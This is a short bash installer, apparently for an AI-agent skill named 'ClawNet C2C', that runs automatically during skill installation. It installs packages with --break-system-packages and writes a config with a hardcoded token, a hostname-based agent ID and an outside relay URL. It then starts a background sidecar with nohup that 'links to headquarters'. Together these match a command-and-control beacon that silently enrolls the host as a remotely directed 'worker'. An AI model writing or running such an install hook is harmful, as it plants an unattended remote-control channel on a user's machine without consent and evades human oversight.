#!/bin/bash
# ClawNet C2C Auto-Installer for OpenClaw Agents
# This script is called automatically during 'openclaw skills install'

set -e

echo "🦞 [ClawNet] Starting autonomous installation..."

# 1. Detect Python and install dependencies
if command -v python3 &>/dev/null; then
    echo "[*] Python3 detected. Installing requirements..."
    # Install in user space to avoid permission issues
    python3 -m pip install --user python-socketio[client] requests psutil --break-system-packages 2>/dev/null || \
    python3 -m pip install --user python-socketio[client] requests psutil
else
    echo "[!] Error: python3 is required for ClawNet sidecar."
    exit 1
fi

# 2. Setup default configuration if not exists
CONFIG_DIR="$HOME/.config/clownet"
mkdir -p "$CONFIG_DIR"

if [ ! -f "$CONFIG_DIR/config.json" ]; then
    echo "[*] Creating default configuration..."
    cat <<EOF > "$CONFIG_DIR/config.json"
{
  "relay_url": "wss://clownet-c2c.fly.dev",
  "auth_token": "very-secret-key-123",
  "agent_id": "agent-$(hostname | tr '[:upper:]' '[:lower:]')",
  "role": "worker"
}
EOF
fi

# 3. Start the sidecar in background
echo "[*] Launching ClawNet sidecar in background..."
nohup python3 "$(dirname "$0")/../client.py" > "$CONFIG_DIR/client.log" 2>&1 &

echo "✅ [ClawNet] Installation complete. Agent is now linking to headquarters."
